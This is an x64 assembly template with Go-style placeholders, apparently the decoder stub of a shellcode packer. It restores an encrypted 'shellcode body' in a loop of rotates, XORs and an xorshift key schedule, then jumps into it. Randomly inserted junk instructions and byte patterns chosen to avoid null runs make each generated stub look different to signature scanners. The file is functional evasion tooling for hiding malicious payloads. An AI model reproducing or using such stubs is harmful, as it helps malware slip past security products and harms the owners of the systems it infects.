.code64

// the ret and next labels are used to prevent
// "0x00, 0x00, 0x00" and "0xFF, 0xFF, 0xFF"
// about call or jmp instructions

// iji means insert junk instruction
// ijs means insert junk instruction with short version

// rax store the seed
// rbx store the key
// rcx store the loop times
// rsi store the body address

header:
  // save context
  push {{.Reg.rax}}                            {{iji}}
  push {{.Reg.rbx}}                            {{iji}}
  push {{.Reg.rcx}}                            {{iji}}
  push {{.Reg.rsi}}                            {{iji}}
  push {{.Reg.rdi}}                            {{iji}}
  pushfq                                       {{iji}}

  mov {{.Reg.eax}}, {{hex .Seed}}              {{iji}}
  mov {{.Reg.ebx}}, {{hex .Key}}               {{iji}}

  // prevent continuous 0x00
  mov {{.Reg.ecx}}, {{hex .NumLoopStub}}       {{iji}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskA}}      {{iji}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskB}}      {{iji}}

  // calculate the body address
  lea {{.Reg.rsi}}, [rip + body + {{hex .OffsetT}}]   {{iji}}
  add {{.Reg.rsi}}, {{hex .OffsetA}}                  {{iji}}
  sub {{.Reg.rsi}}, {{hex .OffsetS}}                  {{iji}}

  // unshuffle shellcode body
 loop_unshuffle:
  mov {{.Reg.edi}}, [{{.Reg.rsi}}]             {{ijs}}
  ror {{.Reg.edi}}, 17                         {{ijs}}
  xor {{.Reg.edi}}, {{.Reg.eax}}               {{ijs}}
  rol {{.Reg.edi}}, 7                          {{ijs}}
  xor {{.Reg.edi}}, {{.Reg.ebx}}               {{ijs}}
  mov [{{.Reg.rsi}}], {{.Reg.edi}}             {{ijs}}


  call xor_shift_32                             {{ijs}}


  // update counter
  dec {{.Reg.ecx}}                             {{iji}}
  jnz loop_unshuffle                           {{iji}}

  // restore context
  popfq                                        {{iji}}
  pop {{.Reg.rdi}}                             {{iji}}
  pop {{.Reg.rsi}}                             {{iji}}
  pop {{.Reg.rcx}}                             {{iji}}
  pop {{.Reg.rbx}}                             {{iji}}
  pop {{.Reg.rax}}                             {{iji}}

  jmp body                                     {{iji}}

xor_shift_32:
  // rdx store the xor shift median
  // rbp store the immediate value
  push {{.Reg.rdx}}                            {{ijs}}
  push {{.Reg.rbp}}                            {{ijs}}

  mov {{.Reg.edx}}, {{.Reg.eax}}               {{ijs}}
  mov {{.Reg.ebp}}, {{.Imm.v_13}}              {{iji}}
  xor {{.Reg.ebp}}, {{.Reg.ebx}}               {{ijs}}
  shl {{.Reg.edx}}, {{.Reg.ebp}}               {{iji}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{ijs}}

  mov {{.Reg.edx}}, {{.Reg.eax}}               {{iji}}
  mov {{.Reg.ebp}}, {{.Imm.v_17}}              {{ijs}}
  xor {{.Reg.ebp}}, {{.Reg.ebx}}               {{iji}}
  shr {{.Reg.edx}}, {{.Reg.ebp}}               {{ijs}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{iji}}

  mov {{.Reg.edx}}, {{.Reg.eax}}               {{ijs}}
  mov {{.Reg.ebp}}, {{.Imm.v_5}}               {{ijs}}
  xor {{.Reg.ebp}}, {{.Reg.ebx}}               {{iji}}
  shl {{.Reg.edx}}, {{.Reg.ebp}}               {{iji}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{ijs}}

  // restore context
  pop {{.Reg.rbp}}                             {{iji}}
  pop {{.Reg.rdx}}                             {{iji}}
  ret                                          {{iji}}

body:
  // loader or raw shellcode
